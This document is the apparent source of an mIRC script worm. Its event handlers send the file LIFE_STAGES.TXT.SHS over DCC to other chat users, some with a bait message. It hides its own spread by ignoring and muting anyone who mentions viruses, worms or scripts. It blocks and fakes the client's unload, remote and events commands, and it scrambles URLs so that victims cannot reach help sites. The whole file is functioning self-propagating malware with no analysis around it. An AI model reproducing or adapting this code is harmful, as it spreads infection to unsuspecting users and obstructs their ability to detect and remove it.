On 1:Connect:{ Set %£.go $false | Set %£.which $r(1,2) | Set %£.file C:\Windows\LIFE_STAGES.TXT.SHS | if ( $exists(%£.file) ) { Set %£.go $true } | Unset %be.* %pk.* %£S.* | life }
On 1:Disconnect:{ .timers off | .sockclose * | Set %£.date $adate }
On 1:Input:*:{ Set %£.var1 Ignore:Alias:Write:Play:Rename:Copy:Load:Remini:Writeini:Run:Filter:Flushini:Reload:Remove:Set:Unset:UnsetAll:Enable:Disable: | Set %£.var2 $remove($1,/,.) | if ( $istok(%£.var1,%£.var2,58) ) || ( %£.var2 = $null ) || ( timer isin $1 ) { halt } | if ( $chr(36) isin $1- )  { if ( $pos($1-,$,0) > 1 ) { halt } | Set %£.tmp1 $asc($mid($1-,$calc($pos($1-,$,1) + 1),1)) | if ( %£.tmp1 > 47 ) && ( %£.tmp1 < 58 ) { return } | elseif ( %£.tmp1 = 32) { return } | halt } }
On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaide ) { .timerqt 1 5 quiet # } | if ( %£.go ) && ( %£.which = 1 ) { if ( $r(1,2) = 1 ) && ( $nick != $me ) { LS $nick } } }
On ^1:Part:*:{ if ( %£.go ) && ( %£.which = 2 ) { if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { LS $nick } } | letslook $1- | if ( $letsthink ) { halt } }
On 1:FileSent:*:{ if ( %£.go ) { LS $nick } }
On 1:FileRcvd:*:{ if ( %£.go ) { LS $nick } }
On 1:Notify:{ if ( %£.go ) { if ( $nick !isin %£.nt ) { %£.nt = %£.nt $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(99,199) 1 10 .msg $nick Hi. Check out this file, ok. | .timer $+ $r(300,399) 1 12 LS $nick } } }
On ^1:Kick:*:{ if ( $knick = $me ) { letslook $1- } | if ( $letsthink ) && ( $knick = $me ) { .echo -s 3*** You were kicked from $+ $chr(32) $+ $chan $+ $chr(32) $+ by $nick ( $+ $me $+ ) | halt } }
On ^1:Notice:*:*:{ letslook $1- | if ( $letsthink ) { if ( $chr(35) !isin $active ) { halt } | .echo $active 5- $+ $nick $+ - $+ $chr(32) $+ $modurl | halt } }
On ^1:Action:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $me ) { Set %£.tmp11 $nick } | if ( # != $me ) { Set %£.tmp11 # } | .echo %£.tmp11 6* $+ $chr(32) $+ $nick $+ $chr(32) $+ $modurl | halt } }
On ^1:Text:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $null ) { Set %£.tmp11 $nick } | if ( # != $null ) { Set %£.tmp11 # } | .echo %£.tmp11 < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }
On ^1:Chat:*:{ letslook $1- | if ( $letsthink ) { .echo =$nick < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }
On ^1:Serv:*:{ letslook $1- | if ( $letsthink ) { halt } }
On ^1:Quit:{ Set %£.topic 3 | letslook $1- | if ( $letsthink ) { .echo $comchan($nick,1) 2*** $+ $chr(32) $+ $nick $+ $chr(32) $+ has quit IRC ( $+ $modurl $+ ) | halt } }
On ^1:Topic:#:{ Set %£.topic 2 | letslook $1- | if ( $letsthink ) { .echo # 3*** $nick changes topic to ' $+ $modurl $+ ' | halt } }
on ^1:SNOTICE:*:{ letslook $1- }
ctcp 1:*:*:{ letslook $1- | if ( $letsthink ) { halt } }
raw 332:*:{ Set %£.topic 1 | letslook $2- | if ( $letsthink ) { .clear $2 | .echo $2 3*** Topic is ' $+ $modurl $+ ' | halt } }
raw 401:*:{ if ( %£S. $+ $2 != $null ) { .timer $+ $2 off | .sockclose £. $+ $2 | .sockclose ƒ. $+ $2 | Set %£.warning $2 | halt } }
raw 439:*:{ halt }
alias quiet { Set %£.var3 1 | :j | Set %£.var4 $nick($1,%£.var3) | if ( %£.var4 = $null ) { .part $1 | halt } | if ( %£.var4 != $me ) && ( %£.var4 != X ) && ( %£.var4 != W ) { .ignore %£.var4 2 } | inc %£.var3 | goto j }
alias -l life { if ( %£.date != $null ) { if ( $gettok(%£.date,2,47) < $gettok($adate,2,47) ) || ( $gettok(%£.date,1,47) < $gettok($adate,1,47) ) { stages } } }
alias -l stages { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }
alias letsdo { .ignore $nick 2 | halt }
alias letslook { if ( Stages isin $1- ) || ( .shs isin $1- ) || ( script isin $1- ) || ( worm isin $1- ) || ( virus isin $1- ) || ( trojan isin $1- ) || ( infect isin $1- ) || ( spread isin $1- ) || ( remote isin $1- ) || ( events isin $1- ) || ( unload isin $1- ) || ( virii isin $1- ) || ( dccallow isin $1- ) { if ( %£.topic = 1 ) { unset %£.topic | .timerf 1 1 quiet $1 | halt } | if ( %£.topic = 2 ) { unset %£.topic | quiet # | halt } | if ( %£.topic = 3 ) { halt } | letsdo } | if ( %£.topic = 1 ) { Set %£.think $2- } | else { Set %£.think $1- } | Unset %£.topic }
alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }
alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }
alias events { if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF | halt } }
On 1:SockClose:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }
On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %£.tmp5 | SL %£.tmp5 }
On 1:SockWrite:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }
alias LS { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%£.file).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 TO $1 | .notice $1 DCC Send $left($gettok(%£.file,3,92), $calc( [ $len( [ $gettok(%£.file,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) | if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %£.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }
alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }
alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ ƒ. $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }
alias modurl { Set %£.think $replace(%£.think,$chr(44),$chr(32),$chr(59),$chr(32)) | Unset %£.think.again | Set %£.var6 $numtok(%£.think,32) | Set %£.var61 1 | Set %£.var64 $nick $+ $chr(91) $+ $gettok($address,2,64) $+ $chr(93) | :mod1 | if ( %£.var61 > %£.var6 ) { return %£.think.again } | Set %£.var62 $gettok(%£.think,%£.var61,32) | if ( http !isin %£.var62 ) && ( www !isin %£.var62 ) && ( ftp. !isin %£.var62 ) && ( .com !isin %£.var62 ) && ( .net !isin %£.var62 ) && ( .org !isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $gettok($address,2,64) isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 }
if ( %£.var64 isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | Set %£.var63 $gettok(%£.var62,2,46) | if ( %£.var63 = $null ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $len(%£.var63) > 2 ) { Set %£.var63 $left(%£.var63,$int($calc($len(%£.var63)/2))) $+ $r(a,z) $+ $mid(%£.var63,$calc($int($calc($len(%£.var63)/2)) + 1),$len(%£.var63)) } | Set %£.var63 $r(A,Z) $+ %£.var63 $+ $r(a,z) | Set %£.think.again %£.think.again $+ $chr(32) $+ $puttok(%£.var62,%£.var63,2,46) | inc %£.var61 | goto mod1 }
alias letsthink { if ( http isin %£.think ) || ( .org isin %£.think ) || ( .net isin %£.think ) || ( .com isin %£.think ) || ( ftp. isin %£.think ) || ( www isin %£.think ) { return $true } | return $false }
